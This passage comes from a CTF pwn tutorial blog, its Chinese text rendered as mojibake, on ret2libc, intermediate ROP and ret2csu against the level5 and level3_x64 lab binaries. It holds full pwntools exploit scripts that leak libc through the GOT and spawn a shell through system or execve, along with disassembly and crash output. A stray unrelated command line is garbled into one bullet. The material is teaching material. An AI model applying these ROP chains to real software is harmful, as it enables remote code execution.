class="hljs-number">0x41780</span><br>offset_bin_sh = <span class="hljs-number">0x18e363</span><br><span class="hljs-comment">#è®¡ç®—çœŸå®åœ°å€</span><br>libc_system=base_libc+offset_system<br>libc_bin_sh = base_libc+offset_bin_sh<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(libc_system) + p32(addr_start) + p32(libc_bin_sh)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æˆåŠŸï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250827171715096.png" alt="image-20250827171715096"></p><h1 id="06-ä¸­çº§ROP">06 ä¸­çº§ROP</h1><p>32ä½æ“ä½œç³»ç»Ÿæ€»çš„æ¥è¯´é™¤äº†ç³»ç»Ÿè°ƒç”¨æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ å‚çš„ï¼Œå…¶ä»–libcåº“å‡½æ•°éƒ½æ˜¯é€šè¿‡æ ˆæ¥ä¼ å‚çš„ï¼Œå› æ­¤è¿˜ä¸ç®—å¾ˆæ£˜æ‰‹ã€‚ä½†æ˜¯64ä½æ“ä½œç³»ç»Ÿçš„å‡½æ•°è°ƒç”¨éƒ½æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ å‚ï¼Œåº“å‡½æ•°è°ƒç”¨æ—¶å¯„å­˜å™¨ä¼ å‚çš„é¡ºåºä¸ºï¼š<strong>rdi</strong>ï¼Œ<strong>rsi</strong>ï¼Œ<strong>rdx</strong>ï¼Œ<strong>rcx</strong>ï¼Œ<strong>r8</strong>ï¼Œ<strong>r9</strong>ã€‚ç³»ç»Ÿè°ƒç”¨æ—¶å‚æ•°ä¼ é€’ä¸€èˆ¬ä¸ºï¼š<strong>rax</strong>ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼Œå…¶ä½™å‚æ•°ä¼ é€’ä¸º<strong>rdi</strong>ï¼Œ<strong>rsi</strong>ï¼Œ<strong>rdx</strong>ï¼Œ<strong>r10</strong>ï¼Œ<strong>r8</strong>ï¼Œ<strong>r9</strong>ã€‚</p><p>ä½†æ˜¯ä¸€èˆ¬ç¨‹åºä¸­å¾ˆéš¾å‡ºç°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ gadgetsã€‚è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ x64 ä¸‹çš„ __libc_csu_init ä¸­çš„ gadgetsã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹ libc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨ libc å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•° (å½“ç„¶ï¼Œä¸åŒç‰ˆæœ¬çš„è¿™ä¸ªå‡½æ•°æœ‰ä¸€å®šçš„åŒºåˆ«)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000004005A0 ; void _libc_csu_init(void)<br>.text:00000000004005A0                 public __libc_csu_init<br>.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16â†‘o<br>.text:00000000004005A0<br>.text:00000000004005A0 var_30          = qword ptr -30h<br>.text:00000000004005A0 var_28          = qword ptr -28h<br>.text:00000000004005A0 var_20          = qword ptr -20h<br>.text:00000000004005A0 var_18          = qword ptr -18h<br>.text:00000000004005A0 var_10          = qword ptr -10h<br>.text:00000000004005A0 var_8           = qword ptr -8<br>.text:00000000004005A0<br>.text:00000000004005A0 ; __unwind &#123;<br>.text:00000000004005A0                 mov     [rsp+var_28], rbp<br>.text:00000000004005A5                 mov     [rsp+var_20], r12<br>.text:00000000004005AA                 lea     rbp, cs:600E24h<br>.text:00000000004005B1                 lea     r12, cs:600E24h<br>.text:00000000004005B8                 mov     [rsp+var_18], r13<br>.text:00000000004005BD                 mov     [rsp+var_10], r14<br>.text:00000000004005C2                 mov     [rsp+var_8], r15<br>.text:00000000004005C7                 mov     [rsp+var_30], rbx<br>.text:00000000004005CC                 sub     rsp, 38h<br>.text:00000000004005D0                 sub     rbp, r12<br>.text:00000000004005D3                 mov     r13d, edi<br>.text:00000000004005D6                 mov     r14, rsi<br>.text:00000000004005D9                 sar     rbp, 3<br>.text:00000000004005DD                 mov     r15, rdx<br>.text:00000000004005E0                 call    _init_proc<br>.text:00000000004005E5                 test    rbp, rbp<br>.text:00000000004005E8                 jz      short loc_400606<br>.text:00000000004005EA                 xor     ebx, ebx<br>.text:00000000004005EC                 nop     dword ptr [rax+00h]<br>.text:00000000004005F0<br>.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64â†“j<br>.text:00000000004005F0                 mov     rdx, r15<br>.text:00000000004005F3                 mov     rsi, r14<br>.text:00000000004005F6                 mov     edi, r13d<br>.text:00000000004005F9                 call    qword ptr [r12+rbx*8]<br>.text:00000000004005FD                 add     rbx, 1<br>.text:0000000000400601                 cmp     rbx, rbp<br>.text:0000000000400604                 jnz     short loc_4005F0<br>.text:0000000000400606<br>.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48â†‘j<br>.text:0000000000400606                 pop     rbx<br>.text:000000000040060B                 pop     rbp<br>.text:0000000000400610                 pop     r12<br>.text:0000000000400615                 pop     r13<br>.text:000000000040061A                 pop     r14<br>.text:000000000040061F                 pop     r15<br>.text:0000000000400624                 add     rsp, 38h<br>.text:0000000000400628                 retn<br>.text:0000000000400628 ; &#125; // starts at 4005A0<br>.text:0000000000400628 __libc_csu_init endp<br></code></pre></td></tr></table></figure><p>0x0000000000400606ä¸€ç›´åˆ°ç»“å°¾ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ„é€ æ ˆä¸Šæ•°æ®æ¥æ§åˆ¶ rbx,rbp,r12,r13,r14,r15 å¯„å­˜å™¨çš„æ•°æ®ã€‚</p><p>å¯ä»¥çœ‹åˆ°0x00000000004005F0åˆ°0x00000000004005F6è¿™å‡ æ®µå¯ä»¥é€šè¿‡æ§åˆ¶r15ã€r14ã€r13dæ¥æ§åˆ¶rdxã€rsiã€ediã€‚ediä¹Ÿå°±æ˜¯rdiçš„ä½32ä½ï¼Œæ­¤æ—¶rdiçš„é«˜32ä½å¯„å­˜å™¨å€¼ä¸º0ï¼Œå› æ­¤ç›¸å½“äºå¯ä»¥æ§åˆ¶rdiã€‚è€Œè¿™ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œä¹Ÿæ˜¯ x64 å‡½æ•°è°ƒç”¨ä¸­ä¼ é€’çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨ã€‚</p><p>é€šè¿‡0x00000000004005FDåˆ°0x0000000000400604ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ rbx ä¸ rbp çš„ä¹‹é—´çš„å…³ç³»ä¸º rbx+1 = rbpï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ä¼šæ‰§è¡Œloc_4005F0ï¼Œè¿›è€Œå¯ä»¥ç»§ç»­æ‰§è¡Œä¸‹é¢çš„æ±‡ç¼–ç¨‹åºã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„è®¾ç½® rbx=0ï¼Œrbp=1ã€‚</p><h2 id="ret2csu">ret2csu</h2><p>é¢˜ç›®ï¼šè’¸ç±³çš„ä¸€æ­¥ä¸€æ­¥å­¦ ROP ä¹‹ linux_x64 ç¯‡ä¸­ <a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5">level5</a></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250828153527359.png" alt="image-20250828153527359"></p><p>å¯ä»¥çœ‹å‡ºæ˜¯64ä½ç¨‹åºï¼Œå¹¶ä¸”å¼€å¯äº†NXä¿æŠ¤ï¼Œæ¥ä¸‹æ¥æŸ¥çœ‹æ¼æ´ç‚¹</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250828154155061.png" alt="image-20250828154155061"></p><p>å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ ˆæº¢å‡ºæ€è·¯å¤§æ¦‚å¦‚ä¸‹ï¼š</p><ol><li>ä½¿ç”¨write()å‡½æ•°å’Œ __libc_csu_initæ³„éœ²write()å‡½æ•°çš„åœ°å€å¹¶ä½¿ç¨‹åºé‡æ–°æ‰§è¡Œmainå‡½æ•°ã€‚</li><li>æŸ¥æ‰¾å¯¹åº”libcç‰ˆæœ¬ï¼Œè·å–systemå‡½æ•°åœ°å€</li><li>å†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ‰§è¡Œ libc_csu_gadgets å‘ bss æ®µå†™å…¥ systemåœ°å€ä»¥åŠ '/bin/shâ€™ åœ°å€ï¼Œå¹¶ä½¿å¾—ç¨‹åºé‡æ–°æ‰§è¡Œ main å‡½æ•°ã€‚</li><li>å†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ‰§è¡Œ libc_csu_gadgets è·³è½¬æ‰§è¡Œ system(â€˜/bin/shâ€™) è·å– shell</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>csu_front_addr = <span class="hljs-number">0x00000000004005F0</span><br>csu_end_addr = <span class="hljs-number">0x0000000000400606</span><br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x400</span>-<span class="hljs-number">0x380</span>+<span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment">#è®¾ç½®å¯„å­˜å™¨çš„å€¼</span><br>    payload = padding+p64(csu_end_addr)+p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    payload += <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-comment">#æ‰§è¡Œå‚æ•°ä¼ é€’</span><br>    payload+=p64(csu_front_addr)<br>    <span class="hljs-comment">#ç”±äºrbx+1 = rbpï¼Œä¼šç»§ç»­æ‰§è¡Œä¸‹é¢çš„popï¼Œä¹Ÿå°±æ˜¯è¯´å†popä¸€éï¼Œè¿™æ—¶å€™å¡«å……ä¸€äº›åƒåœ¾æ•°æ®å³å¯</span><br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x38</span>+<span class="hljs-number">6</span>*<span class="hljs-number">8</span>)<br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment"># write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, main_addr)<br><span class="hljs-comment">#è·å–åŸºåœ°å€</span><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br><br><span class="hljs-comment">#è·å–systemçš„åœ°å€</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-comment">#</span><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hello, World\n&#x27;</span>)<br>bss_base = elf.bss()<br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,read_got,<span class="hljs-number">0</span>,bss_base,<span class="hljs-number">16</span>, main_addr)<br>sh.send(p64(system_addr)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br><span class="hljs-comment">#æ‰§è¡Œ</span><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hello, World\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,bss_base,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,bss_base+<span class="hljs-number">8</span>,main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>æ„Ÿè§‰æ€è·¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯ä¸€ç›´æŠ¥é”™ï¼ˆå°´å°¬ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[+]</span> Starting local process <span class="hljs-string">&#x27;./level5&#x27;</span>: pid <span class="hljs-number">2098098</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-string">&#x27;/opt/pwn/intermediateROP/level5&#x27;</span><br>    Arch:       amd64-<span class="hljs-number">64</span>-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (<span class="hljs-number">0</span>x400000)<br>    Stripped:   No<br><span class="hljs-selector-attr">[*]</span> Process <span class="hljs-string">&#x27;./level5&#x27;</span> stopped with exit <span class="hljs-selector-tag">code</span> -<span class="hljs-number">11</span> (SIGSEGV) (pid <span class="hljs-number">2098098</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;level5.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">32</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    write_addr = <span class="hljs-built_in">u64</span>(sh<span class="hljs-selector-class">.recv</span>(<span class="hljs-number">8</span>))<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">106</span>, <span class="hljs-keyword">in</span> recv<br>    return self.<span class="hljs-built_in">_recv</span>(numb, timeout) or b<span class="hljs-string">&#x27;&#x27;</span><br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">176</span>, <span class="hljs-keyword">in</span> _recv<br>    <span class="hljs-keyword">if</span> not self<span class="hljs-selector-class">.buffer</span> and not self.<span class="hljs-built_in">_fillbuffer</span>(timeout):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">155</span>, <span class="hljs-keyword">in</span> _fillbuffer<br>    data = self<span class="hljs-selector-class">.recv_raw</span>(self<span class="hljs-selector-class">.buffer</span><span class="hljs-selector-class">.get_fill_size</span>())<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/process.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">743</span>, <span class="hljs-keyword">in</span> recv_raw<br>    raise EOFError<br>EOFError<br></code></pre></td></tr></table></figure><p>ä¹‹åæ¢äº†ä¸ªbuuctfçš„æºæ–‡ä»¶ï¼Œå‘ç°è¿™ä¸ªcsuæ­£å¸¸å¤šäº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000400650 ; void _libc_csu_init(void)<br>.text:0000000000400650                 public __libc_csu_init<br>.text:0000000000400650 __libc_csu_init proc near               ; DATA XREF: _start+16â†‘o<br>.text:0000000000400650 ; __unwind &#123;<br>.text:0000000000400650                 push    r15<br>.text:0000000000400652                 mov     r15d, edi<br>.text:0000000000400655                 push    r14<br>.text:0000000000400657                 mov     r14, rsi<br>.text:000000000040065A                 push    r13<br>.text:000000000040065C                 mov     r13, rdx<br>.text:000000000040065F                 push    r12<br>.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry<br>.text:0000000000400668                 push    rbp<br>.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:0000000000400670                 push    rbx<br>.text:0000000000400671                 sub     rbp, r12<br>.text:0000000000400674                 xor     ebx, ebx<br>.text:0000000000400676                 sar     rbp, 3<br>.text:000000000040067A                 sub     rsp, 8<br>.text:000000000040067E                 call    _init_proc<br>.text:0000000000400683                 test    rbp, rbp<br>.text:0000000000400686                 jz      short loc_4006A6<br>.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]<br>.text:0000000000400690<br>.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54â†“j<br>.text:0000000000400690                 mov     rdx, r13<br>.text:0000000000400693                 mov     rsi, r14<br>.text:0000000000400696                 mov     edi, r15d<br>.text:0000000000400699                 call    ds:(__frame_dummy_init_array_entry - 600840h)[r12+rbx*8]<br>.text:000000000040069D                 add     rbx, 1<br>.text:00000000004006A1                 cmp     rbx, rbp<br>.text:00000000004006A4                 jnz     short loc_400690<br>.text:00000000004006A6<br>.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36â†‘j<br>.text:00000000004006A6                 add     rsp, 8<br>.text:00000000004006AA                 pop     rbx<br>.text:00000000004006AB                 pop     rbp<br>.text:00000000004006AC                 pop     r12<br>.text:00000000004006AE                 pop     r13<br>.text:00000000004006B0                 pop     r14<br>.text:00000000004006B2                 pop     r15<br>.text:00000000004006B4                 retn<br>.text:00000000004006B4 ; &#125; // starts at 400650<br>.text:00000000004006B4 __libc_csu_init endp<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæ€è·¯ä¸å˜ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥ä»pop     rbxå¼€å§‹ï¼Œçœç•¥æ‰add rspäº†ï¼Œé‡æ–°å†™ä¸€ä¸‹ã€‚ç”±äºä½¿ç”¨systemå‡½æ•°ä¸€ç›´å¤±è´¥ï¼Œåœ¨wikiä¸­ä¹Ÿæœ‰è¯´æ˜ï¼Œå¯èƒ½æ˜¯ç¯å¢ƒå˜é‡çš„é—®é¢˜ï¼Œæ‰€ä»¥ä½¿ç”¨execveæ¥è·å–shellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh = process(<span class="hljs-string">&#x27;./level3_x64&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./level3_x64&#x27;</span>)<br><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>csu_front_addr = <span class="hljs-number">0x0000000000400690</span><br>csu_end_addr = <span class="hljs-number">0x00000000004006AA</span><br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x3f0</span>-<span class="hljs-number">0x370</span>+<span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx should be 0,</span><br>    <span class="hljs-comment"># rbp should be 1,enable not to jump</span><br>    <span class="hljs-comment"># r12 should be the function we want to call</span><br>    <span class="hljs-comment"># rdi=edi=r15d</span><br>    <span class="hljs-comment"># rsi=r14</span><br>    <span class="hljs-comment"># rdx=r13</span><br>    <span class="hljs-comment">#è®¾ç½®å¯„å­˜å™¨çš„å€¼</span><br>    payload = padding+p64(csu_end_addr)+p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    <span class="hljs-comment">#æ‰§è¡Œå‚æ•°ä¼ é€’</span><br>    payload+=p64(csu_front_addr)<br>    <span class="hljs-comment">#ç”±äºrbx+1 = rbpï¼Œä¼šç»§ç»­æ‰§è¡Œä¸‹é¢çš„popï¼Œä¹Ÿå°±æ˜¯è¯´å†popä¸€éï¼Œè¿™æ—¶å€™å¡«å……ä¸€äº›åƒåœ¾æ•°æ®å³å¯</span><br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.sendline(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment"># write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br><span class="hljs-comment">#è·å–åŸºåœ°å€</span><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br><br><span class="hljs-comment">#è·å–systemçš„åœ°å€</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br><br><span class="hljs-comment">#</span><br>sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>bss_base = elf.bss()<br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,read_got,<span class="hljs-number">16</span>,bss_base,<span class="hljs-number">0</span>, main_addr)<br>sh.send(p64(execve_addr)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br><span class="hljs-comment">#æ‰§è¡Œ</span><br>sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,bss_base,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,bss_base+<span class="hljs-number">8</span>,main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="å…¶ä»–æ–¹å¼">å…¶ä»–æ–¹å¼</h3><p>ç”±äºè¿™é“é¢˜ç›®åŸé¢˜çš„è¿œç¨‹æ˜¯ç¦ç”¨äº†systemå’Œexecveçš„ï¼Œå› æ­¤ä¸Šè¿°è§£æ³•å¯èƒ½åœ¨åŸé¢˜ä¸­å¹¶ä¸é€‚ç”¨ï¼ŒåŸé¢˜çš„æç¤ºæ˜¯è¦ä½¿ç”¨mmapå’Œmprotectæ¥è§£é¢˜ï¼Œæˆ‘ä»¬ä¸€èµ·æ¥çœ‹ä¸€ä¸‹è¯¥æ€ä¹ˆè§£ã€‚</p><ul><li><p>xxxxxxxxxxÂ su -s /bin/sh -c â€œkeystone-manage db_syncâ€ keystonesh</p><p>mmapå‡½æ•°åˆ›å»ºä¸€å—å†…å­˜åŒºåŸŸï¼Œå°†ä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°è¯¥åŒºåŸŸï¼Œè¿›ç¨‹å¯ä»¥åƒæ“ä½œå†…å­˜ä¸€æ ·æ“ä½œæ–‡ä»¶</p></li><li><p><em><em>int mprotect(void</em> addr, size_t len, int port)</em>*</p><p>mprotectå‡½æ•°å¯ä»¥æ”¹å˜ä¸€å—å†…å­˜åŒºåŸŸçš„æƒé™(ä»¥é¡µä¸ºå•ä½)ï¼Œaddrå‚æ•°è¡¨ç¤ºæ‰€æ”¹å˜å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œä¹Ÿæ˜¯å¯¹åº”å†…å­˜å—çš„æŒ‡é’ˆï¼Œlenä»£è¡¨å†…å­˜å—çš„å¤§å°ï¼Œè€Œprotä»£è¡¨å†…å­˜å—æ‰€æ‹¥æœ‰çš„æƒé™ã€‚</p><p>å¯¹äºprotæ¥è¯´ï¼Œå¯¹åº”æƒé™ä¾ç…§ä»¥ä¸‹è§„åˆ™æ”¹å˜å€¼</p><p>æ— æ³•è®¿é—® å³PROT_NONEï¼šä¸å…è®¸è®¿é—®ï¼Œå€¼ä¸º 0</p><p>å¯è¯»æƒé™ 